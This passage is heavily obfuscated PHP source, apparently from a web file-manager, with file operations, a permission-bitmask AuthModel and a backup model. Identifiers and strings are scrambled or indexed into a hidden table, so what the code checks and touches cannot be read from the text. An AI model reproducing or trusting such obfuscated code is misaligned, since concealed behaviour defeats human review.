chmod($ô¯Ë›–¥, $this->pathAuth); $ô¯Ë›–¥ = $this->iconvApp($ô¯Ë›–¥); if (!$this->delFolder($ô¯Ë›–¥)) { return !1; } } } } closedir($á¥π°ôÕ); return rmdir($ß‡õ¶∆‡); } public function rename($ÖÊëŒ‰µ, $…◊œÆß‰) { $Å°¢úÌ§ =& $_SERVER[Á≈ ä ∞]; $ÚÙùæÄ“ = $this->fileNameAuto($this->pathFather($ÖÊëŒ‰µ), $…◊œÆß‰); $ÚÙùæÄ“ = $this->iconvSystem($ÚÙùæÄ“); $ÖÊëŒ‰µ = $this->iconvSystem($ÖÊëŒ‰µ); $±ÿ†⁄ìŸ = $this->pathFather($ÖÊëŒ‰µ); $˚®ÁÿÌ“ = rtrim($±ÿ†⁄ìŸ, $Å°¢úÌ§[18]) . $Å°¢úÌ§[18] . $ÚÙùæÄ“; $ºœıµ›Ñ = @rename($ÖÊëŒ‰µ, $˚®ÁÿÌ“); $˚®ÁÿÌ“ = $this->iconvApp($˚®ÁÿÌ“); return $ºœıµ›Ñ ? $this->getPathOuter($˚®ÁÿÌ“) : !1; } public function size($Ö„—ò«≠) { $Ö„—ò«≠ = $this->iconvSystem($Ö„—ò«≠); return filesize_64($Ö„—ò«≠); } public function info($ŸÀ¶Í˚ˆ) { $ŸÀ¶Í˚ˆ = $this->iconvSystem($ŸÀ¶Í˚ˆ); if ($this->isFolder($ŸÀ¶Í˚ˆ)) { return $this->folderInfo($ŸÀ¶Í˚ˆ); } else { if ($this->isFile($ŸÀ¶Í˚ˆ)) { return $this->fileInfo($ŸÀ¶Í˚ˆ); } } return !1; } protected function infoChildren($’œ»œØ—, &$í ô™Â‡, $Ω‘π¸ô» = true) { $ªΩóÇ¬¶ =& $_SERVER[Á≈ ä ∞]; check_abort_echo(); $’œ»œØ— = rtrim($’œ»œØ—, $ªΩóÇ¬¶[18]) . $ªΩóÇ¬¶[18]; if ($Ω‘π¸ô») { $’œ»œØ— = $this->iconvSystem($’œ»œØ—); } if (!($ú≥ÃπËÔ = @opendir($’œ»œØ—))) { return; } while (($Ó“óπ¬Ó = readdir($ú≥ÃπËÔ)) !== !1) { if ($Ó“óπ¬Ó == $ªΩóÇ¬¶[20] || $Ó“óπ¬Ó == $ªΩóÇ¬¶[1377]) { continue; } $˝Ùœ¢—≤ = $’œ»œØ— . $Ó“óπ¬Ó; if (is_file($˝Ùœ¢—≤) || is_link($˝Ùœ¢—≤)) { $í ô™Â‡[$ªΩóÇ¬¶[87]]++; $í ô™Â‡[$ªΩóÇ¬¶[86]] += filesize_64($˝Ùœ¢—≤); } else { if (is_dir($˝Ùœ¢—≤)) { $í ô™Â‡[$ªΩóÇ¬¶[88]]++; $this->infoChildren($˝Ùœ¢—≤, $í ô™Â‡, !1); } } } closedir($ú≥ÃπËÔ); } private function folderInfo($ªçπ˛¶®, $úÃ†∏Àà = false) { $˛ˆˆù∑ò =& $_SERVER[Á≈ ä ∞]; $ªçπ˛¶® = rtrim($ªçπ˛¶®, $˛ˆˆù∑ò[18]) . $˛ˆˆù∑ò[18]; $∫ÁèÇ¯ñ = $this->iconvApp($this->pathThis($ªçπ˛¶®)); if ($úÃ†∏Àà) { return array($˛ˆˆù∑ò[42] => $∫ÁèÇ¯ñ, $˛ˆˆù∑ò[94] => $this->getPathOuter($ªçπ˛¶®), $˛ˆˆù∑ò[43] => $˛ˆˆù∑ò[85]); } $¬£Ö»ñº = array($˛ˆˆù∑ò[42] => $∫ÁèÇ¯ñ, $˛ˆˆù∑ò[94] => $this->getPathOuter($ªçπ˛¶®), $˛ˆˆù∑ò[43] => $˛ˆˆù∑ò[85], $˛ˆˆù∑ò[210] => @filectime($ªçπ˛¶®), $˛ˆˆù∑ò[95] => @filemtime($ªçπ˛¶®), $˛ˆˆù∑ò[1380] => @fileatime($ªçπ˛¶®), $˛ˆˆù∑ò[1381] => is_readable($ªçπ˛¶®), $˛ˆˆù∑ò[1382] => is_writable($ªçπ˛¶®), $˛ˆˆù∑ò[1383] => get_mode($ªçπ˛¶®)); return $¬£Ö»ñº; } private function fileInfo($ô∞úÇÎ∞, $≤§•áèÑ = false) { $∏¯˘È°ﬁ =& $_SERVER[Á≈ ä ∞]; $ì«ç»◊É = $this->iconvApp($this->pathThis($ô∞úÇÎ∞)); if ($≤§•áèÑ) { return array($∏¯˘È°ﬁ[42] => $ì«ç»◊É, $∏¯˘È°ﬁ[94] => $this->getPathOuter($ô∞úÇÎ∞), $∏¯˘È°ﬁ[43] => $∏¯˘È°ﬁ[209], $∏¯˘È°ﬁ[86] => $this->size($ô∞úÇÎ∞), $∏¯˘È°ﬁ[184] => $this->ext($ì«ç»◊É)); } $ô§§°ç± = array($∏¯˘È°ﬁ[42] => $ì«ç»◊É, $∏¯˘È°ﬁ[94] => $this->getPathOuter($ô∞úÇÎ∞), $∏¯˘È°ﬁ[43] => $∏¯˘È°ﬁ[209], $∏¯˘È°ﬁ[210] => @filectime($ô∞úÇÎ∞), $∏¯˘È°ﬁ[95] => @filemtime($ô∞úÇÎ∞), $∏¯˘È°ﬁ[1380] => @fileatime($ô∞úÇÎ∞), $∏¯˘È°ﬁ[86] => $this->size($ô∞úÇÎ∞), $∏¯˘È°ﬁ[184] => $this->ext($ì«ç»◊É), $∏¯˘È°ﬁ[1381] => is_readable($ô∞úÇÎ∞), $∏¯˘È°ﬁ[1382] => is_writable($ô∞úÇÎ∞), $∏¯˘È°ﬁ[1383] => get_mode($ô∞úÇÎ∞)); return $ô§§°ç±; } public function exist($¿ ÄæÇë) { $¿ ÄæÇë = $this->iconvSystem($¿ ÄæÇë); return @file_exists($¿ ÄæÇë); } public function isFile($±∞âÀäï) { $±∞âÀäï = $this->iconvSystem($±∞âÀäï); return @is_file($±∞âÀäï); } public function isFolder($˜∆Ü°•´) { $˜∆Ü°•´ = $this->iconvSystem($˜∆Ü°•´); return @is_dir($˜∆Ü°•´); } public function listPath($°€√˘˝Û, $ÍÇøüëÿ = false) { $Ÿ€„›Œﬁ =& $_SERVER[Á≈ ä ∞]; $°€√˘˝Û = $this->iconvSystem($°€√˘˝Û); $°€√˘˝Û = rtrim($°€√˘˝Û, $Ÿ€„›Œﬁ[18]) . $Ÿ€„›Œﬁ[18]; $“èÈâ™ı = array($Ÿ€„›Œﬁ[92] => array(), $Ÿ€„›Œﬁ[93] => array()); if (!($Í∆´∫±± = @opendir($°€√˘˝Û))) { return $“èÈâ™ı; } while (($îóÖüìÀ = readdir($Í∆´∫±±)) !== !1) { if ($îóÖüìÀ == $Ÿ€„›Œﬁ[20] || $îóÖüìÀ == $Ÿ€„›Œﬁ[1377]) { continue; } $ﬁ‘úïö∂ = $°€√˘˝Û . $îóÖüìÀ; if (is_file($ﬁ‘úïö∂)) { $“èÈâ™ı[$Ÿ€„›Œﬁ[93]][] = $this->fileInfo($ﬁ‘úïö∂, $ÍÇøüëÿ); } else { $“èÈâ™ı[$Ÿ€„›Œﬁ[92]][] = $this->folderInfo($ﬁ‘úïö∂, $ÍÇøüëÿ); } } closedir($Í∆´∫±±); return $“èÈâ™ı; } public function listAll($È òÙ√∫, &$“Ï¥Í©á = array()) { $˜çôıÔâ =& $_SERVER[Á≈ ä ∞]; $È òÙ√∫ = $this->iconvSystem($È òÙ√∫); $È òÙ√∫ = rtrim($È òÙ√∫, $˜çôıÔâ[18]) . $˜çôıÔâ[18]; if (!($º¿ü’‰Ô = @opendir($È òÙ√∫))) { return $“Ï¥Í©á; } while (($óÑ®ÃÆö = readdir($º¿ü’‰Ô)) !== !1) { if ($óÑ®ÃÆö == $˜çôıÔâ[20] || $óÑ®ÃÆö == $˜çôıÔâ[1377]) { continue; } $Úª éâ = $È òÙ√∫ . $óÑ®ÃÆö; if (is_dir($Úª éâ) && !is_link($Úª éâ)) { $“Ï¥Í©á[] = array($˜çôıÔâ[94] => $Úª éâ . $˜çôıÔâ[18], $˜çôıÔâ[85] => 1, $˜çôıÔâ[95] => @filemtime($Úª éâ), $˜çôıÔâ[86] => 0); $this->listAll($Úª éâ, $“Ï¥Í©á); } else { $“Ï¥Í©á[] = array($˜çôıÔâ[94] => $Úª éâ, $˜çôıÔâ[85] => 0, $˜çôıÔâ[95] => @filemtime($Úª éâ), $˜çôıÔâ[86] => $this->size($Úª éâ)); } } closedir($º¿ü’‰Ô); return $“Ï¥Í©á; } public function has($≥ﬁÈƒíÊ, $¥œ∫¡€› = false, $È«Çó˚ÿ = true) { $¿øŸ∫∑ƒ =& $_SERVER[Á≈ ä ∞]; $≥ﬁÈƒíÊ = $this->iconvSystem($≥ﬁÈƒíÊ); $≥ﬁÈƒíÊ = rtrim($≥ﬁÈƒíÊ, $¿øŸ∫∑ƒ[18]) . $¿øŸ∫∑ƒ[18]; if (!($›ÖãÛ◊Ã = @opendir($≥ﬁÈƒíÊ))) { return !1; } $†€Äüúõ = 0; $üª«°®ﬁ = 0; $Ô°•éõ¨ = 0; while (($÷ó„„„å = readdir($›ÖãÛ◊Ã)) !== !1) { if ($÷ó„„„å == $¿øŸ∫∑ƒ[20] || $÷ó„„„å == $¿øŸ∫∑ƒ[1377]) { continue; } $Èù“ïöƒ = $≥ﬁÈƒíÊ . $÷ó„„„å; if ($¥œ∫¡€›) { $Ô°•éõ¨++; if (@is_file($Èù“ïöƒ)) { $†€Äüúõ++; } else { $üª«°®ﬁ++; } if ($Ô°•éõ¨ > 10000) { break; } continue; } if ($È«Çó˚ÿ) { if (@is_file($Èù“ïöƒ)) { return !0; } } else { if (@is_dir($Èù“ïöƒ . $¿øŸ∫∑ƒ[18])) { return !0; } } } closedir($›ÖãÛ◊Ã); if ($¥œ∫¡€›) { return array($¿øŸ∫∑ƒ[217] => $†€Äüúõ, $¿øŸ∫∑ƒ[218] => $üª«°®ﬁ); } return !1; } public function hashSimple($œêÌÙ‹Õ) { $ﬂª÷ú›Ú =& $_SERVER[Á≈ ä ∞]; if (!$œêÌÙ‹Õ) { return md5($ﬂª÷ú›Ú[22]); } $œêÌÙ‹Õ = $this->iconvSystem($œêÌÙ‹Õ); $Ë∆‰≈˜Î = $this->size($œêÌÙ‹Õ); $€√á…È≤ = 200; $í¢‹Õ‚Ë = 50; if ($Ë∆‰≈˜Î <= $€√á…È≤ * $í¢‹Õ‚Ë) { return $this->hashMd5($œêÌÙ‹Õ) . $Ë∆‰≈˜Î; } $ﬂ®€æ∆¡ = $ﬂª÷ú›Ú[22]; $§ú–˛¶“ = intval($Ë∆‰≈˜Î / $í¢‹Õ‚Ë); $…º‡¸œÌ = fopen($œêÌÙ‹Õ, $ﬂª÷ú›Ú[1384]); if (!$…º‡¸œÌ) { return $ﬂ®€æ∆¡; } for ($„ì‡„≥É = 0; $„ì‡„≥É < $í¢‹Õ‚Ë; $„ì‡„≥É++) { fseek_64($…º‡¸œÌ, $§ú–˛¶“ * $„ì‡„≥É); $ﬂ®€æ∆¡ .= fread($…º‡¸œÌ, $€√á…È≤); } fseek_64($…º‡¸œÌ, $Ë∆‰≈˜Î - $€√á…È≤); $ﬂ®€æ∆¡ .= fread($…º‡¸œÌ, $€√á…È≤); fclose($…º‡¸œÌ); return md5($ﬂ®€æ∆¡) . $Ë∆‰≈˜Î; } public function getContent($ŸˆˆÍŒ ) { $ŸˆˆÍŒ  = $this->iconvSystem($ŸˆˆÍŒ ); return file_get_contents($ŸˆˆÍŒ ); } public function setContent($ùÿ÷ñª¬, $È¿ëÜù£ = '') { $ùÿ÷ñª¬ = $this->iconvSystem($ùÿ÷ñª¬); $¨ôÇƒÿˆ = @file_put_contents($ùÿ÷ñª¬, $È¿ëÜù£, LOCK_EX); clearstatcache(); @chmod($ùÿ÷ñª¬, $this->pathAuth); return $¨ôÇƒÿˆ === !1 ? !1 : !0; } public function fileSubstr($à±¿ºï¯, $√©ıñÔô = 0, $Àã¶≥ŸË = false) { $Ω¥–‚∂€ =& $_SERVER[Á≈ ä ∞]; $à±¿ºï¯ = $this->iconvSystem($à±¿ºï¯); if ($Àã¶≥ŸË === !1) { $Àã¶≥ŸË = $this->size($à±¿ºï¯); } if ($Àã¶≥ŸË <= 0) { return $Ω¥–‚∂€[22]; } $¯–ÖÛÚö = fopen($à±¿ºï¯, $Ω¥–‚∂€[1384]); if (!$¯–ÖÛÚö) { return !1; } fseek_64($¯–ÖÛÚö, $√©ıñÔô); $ÆêÃÛØ = fread($¯–ÖÛÚö, $Àã¶≥ŸË); fclose($¯–ÖÛÚö); return $ÆêÃÛØ; } public function upload($ﬁ«ºÚ≤∏, $ûî¥ÌÅ˚, $¨›⁄ÊÌ∞ = false, $…ò”ÕÚ” = REPEAT_REPLACE) { if ($¨›⁄ÊÌ∞) { return $this->moveFile($ûî¥ÌÅ˚, $ﬁ«ºÚ≤∏); } return $this->copyFile($ûî¥ÌÅ˚, $ﬁ«ºÚ≤∏); } public function setModifyTime($¡¶∑ãÌù, $Ùñπõ‘≥ = '') { @touch($¡¶∑ãÌù, intval($Ùñπõ‘≥)); } public function download($õÖÚÈÒÅ, $ÊÓé≈µ∆) { return $this->iconvSystem($õÖÚÈÒÅ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($»Ùˆ„Î∆) { parent::__construct($»Ùˆ„Î∆); $this->signatureVersion($_SERVER[Á≈ ä ∞][226]); } public function fileOutLink($–üΩÕ∏®) { $“ê§“äÑ =& $_SERVER[Á≈ ä ∞]; if (substr($–üΩÕ∏®, 0, 7) == $“ê§“äÑ[1328]) { $–üΩÕ∏® = $“ê§“äÑ[1329] . substr($–üΩÕ∏®, 7); } header($“ê§“äÑ[171] . $–üΩÕ∏®); die; } } goto dèœ¯Ö∂ﬂÍ; BÚÊ˜¥§Ï∂: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $—èÜÁçï =& $_SERVER[Á≈ ä ∞]; $Ω·§◊∞ß = array(array($—èÜÁçï[429] => LNG($—èÜÁçï[1831]), $—èÜÁçï[1832] => $—èÜÁçï[1833], $—èÜÁçï[1834] => 1, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($—èÜÁçï[429] => LNG($—èÜÁçï[1837]), $—èÜÁçï[1832] => $—èÜÁçï[1838], $—èÜÁçï[1834] => 2, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($—èÜÁçï[429] => LNG($—èÜÁçï[1839]), $—èÜÁçï[1832] => $—èÜÁçï[1840], $—èÜÁçï[1834] => 3, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($—èÜÁçï[429] => LNG($—èÜÁçï[1841]), $—èÜÁçï[1832] => $—èÜÁçï[1842], $—èÜÁçï[1834] => 4, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_VIEW), array($—èÜÁçï[429] => LNG($—èÜÁçï[1843]), $—èÜÁçï[1832] => $—èÜÁçï[1844], $—èÜÁçï[1834] => 5, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($—èÜÁçï[429] => LNG($—èÜÁçï[1845]), $—èÜÁçï[1832] => $—èÜÁçï[1846], $—èÜÁçï[1834] => 6, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($—èÜÁçï[429] => LNG($—èÜÁçï[1847]), $—èÜÁçï[1832] => $—èÜÁçï[1848], $—èÜÁçï[1834] => 7, $—èÜÁçï[1835] => 1, $—èÜÁçï[1836] => 0)); return $Ω·§◊∞ß; } public static function authCheck($ßºŒÒ∆ñ, $î·˘˝àÌ) { $§—ﬁ‹ø£ =& $_SERVER[Á≈ ä ∞]; $ßºŒÒ∆ñ = intval($ßºŒÒ∆ñ); if ($GLOBALS[$§—ﬁ‹ø£[512]] && $GLOBALS[$§—ﬁ‹ø£[16]][$§—ﬁ‹ø£[1849]]) { return !0; } if ($ßºŒÒ∆ñ <= 0) { return !1; } if (($ßºŒÒ∆ñ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ßºŒÒ∆ñ & $î·˘˝àÌ); } public static function authCheckShow($èÁ≈©Â¶) { return self::authCheck($èÁ≈©Â¶, self::AUTH_SHOW); } public static function authCheckView($´Ò∂Ü»ï) { return self::authCheck($´Ò∂Ü»ï, self::AUTH_VIEW); } public static function authCheckDownload($È–Àºè¡) { return self::authCheck($È–Àºè¡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ˆ˛∞¥—ê) { return self::authCheck($ˆ˛∞¥—ê, self::AUTH_UPLOAD); } public static function authCheckEdit($»ïãÒ«‚) { return self::authCheck($»ïãÒ«‚, self::AUTH_EDIT); } public static function authCheckRemove($„›í–ã¥) { return self::authCheck($„›í–ã¥, self::AUTH_REMOVE); } public static function authCheckShare($ÃîàÒõı) { return self::authCheck($ÃîàÒõı, self::AUTH_SHARE); } public static function authCheckComment($≥ŒÜÙœÅ) { return self::authCheck($≥ŒÜÙœÅ, self::AUTH_COMMENT); } public static function authCheckEvent($ßﬂØ÷¨è) { return self::authCheck($ßﬂØ÷¨è, self::AUTH_EVENT); } public static function authCheckRoot($´Ùá†äõ) { return self::authCheck($´Ùá†äõ, self::AUTH_ROOT); } public static function authCheckAction($Îò™äøÁ, $úÓÒ»ˆâ) { $’∏€‡ÿÀ =& $_SERVER[Á≈ ä ∞]; $…¡ãòû∂ = array($’∏€‡ÿÀ[1850] => self::AUTH_VIEW, $’∏€‡ÿÀ[1202] => self::AUTH_DOWNLOAD, $’∏€‡ÿÀ[117] => self::AUTH_UPLOAD, $’∏€‡ÿÀ[1800] => self::AUTH_EDIT, $’∏€‡ÿÀ[1799] => self::AUTH_REMOVE, $’∏€‡ÿÀ[1810] => self::AUTH_SHARE, $’∏€‡ÿÀ[363] => self::AUTH_COMMENT, $’∏€‡ÿÀ[1646] => self::AUTH_EVENT, $’∏€‡ÿÀ[1851] => self::AUTH_ROOT); if (!isset($…¡ãòû∂[$úÓÒ»ˆâ])) { return; } $ÚÃŸÂ¨„ = $…¡ãòû∂[$úÓÒ»ˆâ]; $Îò™äøÁ = intval($Îò™äøÁ); if ($Îò™äøÁ <= 0) { return !1; } if (($Îò™äøÁ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Îò™äøÁ & $ÚÃŸÂ¨„); } public static function authDisable($ºÔ‰◊Ç‰, $ÃÜ®±˝Í) { if (intval($ºÔ‰◊Ç‰) <= 0) { return 0; } return intval($ºÔ‰◊Ç‰) & ~$ÃÜ®±˝Í; } public $optionType = "\123\171\163\x74\145\x6d\56\163\157\x75\162\143\x65\x41\165\x74\150\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\141\x75\x74\x68", "\154\x61\142\145\154", "\x64\x69\x73\x70\154\141\x79", "\x73\x79\163\164\x65\155", "\163\157\x72\164"); public function initData() { $˙†óçï˛ = $this->authDefault(); foreach ($˙†óçï˛ as $à≈œª»∏) { $this->add($à≈œª»∏); } } public function findAuth($√·ø˚¥√, $—É˝…•≠) { $ÖôÏ´Óá =& $_SERVER[Á≈ ä ∞]; $§ÕÍì≥à = parent::listData(); foreach ($§ÕÍì≥à as $öü“∆¶Ø) { $Çåﬁ‚´» = intval($öü“∆¶Ø[$ÖôÏ´Óá[422]]); if ($Çåﬁ‚´» <= 0 || $öü“∆¶Ø[$ÖôÏ´Óá[1852]] == 0) { continue; } if (($Çåﬁ‚´» & $√·ø˚¥√) != $√·ø˚¥√) { continue; } if (($Çåﬁ‚´» & $—É˝…•≠) != 0) { continue; } return $öü“∆¶Ø[$ÖôÏ´Óá[408]]; } return !1; } public function findAuthReadOnly() { $ó›á…µã = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ã√˜ÏÜ¨ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ó›á…µã, $Ã√˜ÏÜ¨); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ìÆê‰õ∂ =& $_SERVER[Á≈ ä ∞]; $Òêºó÷∆ = parent::listData(); $ÁÂ¬î¿» = !1; foreach ($Òêºó÷∆ as $Ôì≠™«Ú) { if ($Ôì≠™«Ú[$ìÆê‰õ∂[422]] <= 0 || $Ôì≠™«Ú[$ìÆê‰õ∂[1852]] == $ìÆê‰õ∂[207]) { continue; } if (!$ÁÂ¬î¿») { $ÁÂ¬î¿» = $Ôì≠™«Ú; continue; } if ($ÁÂ¬î¿»[$ìÆê‰õ∂[422]] > $Ôì≠™«Ú[$ìÆê‰õ∂[422]]) { $ÁÂ¬î¿» = $Ôì≠™«Ú; } } return $ÁÂ¬î¿» ? $ÁÂ¬î¿»[$ìÆê‰õ∂[408]] : $ìÆê‰õ∂[22]; } public function listData($—Ú‘èÒπ = false, $çå∞Ãîß = "\x73\157\162\x74", $∂≠°ù÷Ï = false) { return parent::listData($—Ú‘èÒπ, $çå∞Ãîß, $∂≠°ù÷Ï); } public function update($—ÿÈ≤ûπ, $÷æûÙ±Ü) { $ı≠äû€π =& $_SERVER[Á≈ ä ∞]; $ÅÓÅü£Õ = parent::listData($—ÿÈ≤ûπ); $”˜Ø…≈¥ = $this->findByName($÷æûÙ±Ü[$ı≠äû€π[42]]); if (!$ÅÓÅü£Õ || $”˜Ø…≈¥ && $”˜Ø…≈¥[$ı≠äû€π[408]] != $ÅÓÅü£Õ[$ı≠äû€π[408]]) { return !1; } $this->filterAuth($÷æûÙ±Ü[$ı≠äû€π[422]]); return parent::update($—ÿÈ≤ûπ, $÷æûÙ±Ü); } public function remove($œòµÜ´ﬁ) { $œæÒùäÅ = parent::listData($œòµÜ´ﬁ); if (!$œæÒùäÅ || $œæÒùäÅ[$_SERVER[Á≈ ä ∞][1279]]) { return !1; } return parent::remove($œòµÜ´ﬁ); } public function add($˜óïïã√ = array()) { $˚ô∏«Î‰ =& $_SERVER[Á≈ ä ∞]; if ($this->findByName($˜óïïã√[$˚ô∏«Î‰[42]])) { return !1; } $Ç„©Ú¢Ø = array($˚ô∏«Î‰[42] => $˚ô∏«Î‰[22], $˚ô∏«Î‰[422] => 1, $˚ô∏«Î‰[1853] => $˚ô∏«Î‰[1840], $˚ô∏«Î‰[1852] => 1, $˚ô∏«Î‰[1279] => 0, $˚ô∏«Î‰[1854] => 0); $˜óïïã√ = array_merge($Ç„©Ú¢Ø, $˜óïïã√); $˜óïïã√[$˚ô∏«Î‰[1854]] = $this->getSort(); $this->filterAuth($˜óïïã√[$˚ô∏«Î‰[422]]); return parent::insert($˜óïïã√); } private function getSort() { $¨ãÖ¢Óˆ =& $_SERVER[Á≈ ä ∞]; $÷Ø‚äï≠ = parent::listData(); $—õÚíÖ† = array_to_keyvalue($÷Ø‚äï≠, $¨ãÖ¢Óˆ[22], $¨ãÖ¢Óˆ[1854]); return empty($—õÚíÖ†) ? 0 : max($—õÚíÖ†) + 1; } private function filterAuth(&$˜ØÕ“°) { if (!$˜ØÕ“°) { return; } $˜ÒÄ‹ÍÅ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $êØÌßŸò = array(); foreach ($˜ÒÄ‹ÍÅ as $‚≥Äπë√) { if ($˜ØÕ“° & $‚≥Äπë√) { $êØÌßŸò[] = $‚≥Äπë√; } } if (in_array(self::AUTH_ROOT, $êØÌßŸò)) { $˜ØÕ“° = array_sum($˜ÒÄ‹ÍÅ); return; } $˙©ß© ˙ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($êØÌßŸò as $‚≥Äπë√) { if (isset($˙©ß© ˙[$‚≥Äπë√])) { $êØÌßŸò = array_merge($êØÌßŸò, $˙©ß© ˙[$‚≥Äπë√]); } } $êØÌßŸò[] = self::AUTH_SHOW; $˜ØÕ“° = array_sum(array_unique($êØÌßŸò)); } public function sort($õë˘ŒÏ∆, $´†˙«õÀ) { return parent::update($õë˘ŒÏ∆, $´†˙«õÀ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\x62\141\143\153\x75\x70\114\x69\x73\x74"; public $field = array("\x69\157", "\x6e\x61\x6d\x65", "\163\x74\x61\x74\x75\x73", "\143\x6f\156\164\x65\156\164", "\x6d\x61\x6e\x75\x61\x6c", "\162\x65\163\x75\x6c\164", "\164\x69\155\145\106\x72\x6f\x6d", "\164\151\x6d\145\x54\157"); public function config() { $∆Ãù†»• =& $_SERVER[Á≈ ä ∞]; $í‡°¥£¬ = Model($∆Ãù†»•[777])->get($∆Ãù†»•[787]); $í‡°¥£¬ = json_decode($í‡°¥£¬, !0); $í‡°¥£¬ = is_array($í‡°¥£¬) ? $í‡°¥£¬ : array(); if (!isset($í‡°¥£¬[$∆Ãù†»•[762]])) { $í‡°¥£¬[$∆Ãù†»•[762]] = $∆Ãù†»•[98]; } unset($í‡°¥£¬[$∆Ãù†»•[1628]]); Action($∆Ãù†»•[1855])->taskInit(); Model($∆Ãù†»•[1627])->cacheClear(); $•¨‰¬—¨ = $∆Ãù†»•[1856]; $ˆü¥Üò≈ = Model($∆Ãù†»•[1857])->findByKey($∆Ãù†»•[1646], $•¨‰¬—¨); if (!$ˆü¥Üò≈) { $ˆü¥Üò≈ = array(); } if (isset($ˆü¥Üò≈[$∆Ãù†»•[213]])) { $ˆü¥Üò≈[$∆Ãù†»•[213]] = json_decode($ˆü¥Üò≈[$∆Ãù†»•[213]], !0); } if (isset($í‡°¥£¬[$∆Ãù†»•[213]])) { $ˆü¥Üò≈[$∆Ãù†»•[213]][$∆Ãù†»•[1631]] = $í‡°¥£¬[$∆Ãù†»•[213]]; unset($í‡°¥£¬[$∆Ãù†»•[213]]); } return array_merge($ˆü¥Üò≈, $í‡°¥£¬); } public function listData($∏ÿñ≠Àˆ = false, $≤á˛¬ÜΩ = "\155\x6f\144\151\146\x79\124\151\x6d\145", $¯ä¿Ë˜° = false) { return parent::listData($∏ÿñ≠Àˆ, $≤á˛¬ÜΩ, !0); } public function lastItem() { $‡ò°π∆Õ = $this->listData(); return !empty($‡ò°π∆Õ[0]) ? $‡ò°π∆Õ[0] : null; } public function kill($Û˙§Èéé) { $ÄôÁ„…® =& $_SERVER[Á≈ ä ∞]; $ï⁄Ëﬂâµ = $this->listData($Û˙§Èéé); if (!$ï⁄Ëﬂâµ || empty($ï⁄Ëﬂâµ[$ÄôÁ„…®[42]])) { return !0; } Task::kill($ÄôÁ„…®[786]); Task::kill($ÄôÁ„…®[807]); Task::kill($ÄôÁ„…®[816]); $º„¡ÀöÌ = $ï⁄Ëﬂâµ[$ÄôÁ„…®[42]]; $˚∑©ﬂ¥— = TEMP_FILES . $ÄôÁ„…®[785] . $º„¡ÀöÌ . $ÄôÁ„…®[18]; IO::remove($˚∑©ﬂ¥—, !1); return $this->remove($Û˙§Èéé); } public function remove($Ü¬ªî¿˜) { $Êø˚ÄÚô = $this->listData($Ü¬ªî¿˜); if (!$Êø˚ÄÚô) { return !0; } return $this->backupRemove($Êø˚ÄÚô); } private function backupRemove($ª∏Íêäó) { parent::remove($ª∏Íêäó[$_SERVER[Á≈ ä ∞][408]]); $æè´´€â = $this->backupPath($ª∏Íêäó); IO::remove($æè´´€â, !1); return !0; } private function backupPath($Ç¶Ÿπ∂”) { $¿ßìâ˛π =& $_SERVER[Á≈ ä ∞]; $øå»•Âú = $Ç¶Ÿπ∂”[$¿ßìâ˛π[42]]; $ËÒ¿ÛΩ = Model($¿ßìâ˛π[777])->get($¿ßìâ˛π[778]); $´õèöÜ± = substr(md5($¿ßìâ˛π[779] . $ËÒ¿ÛΩ . $øå»•Âú), 0, 8); return "\173\x69\157\x3a{$Ç¶Ÿπ∂”[$¿ßìâ˛π[759]]}\x7d\57\144\141\x74\141\x62\x61\x73\x65\57\142\141\x63\153\x75\160\x2f" . $øå»•Âú . $¿ßìâ˛π[21] . $´õèöÜ±; } public function start() { $Ù≤¯Ω•Ô =& $_SERVER[Á≈ ä ∞]; if 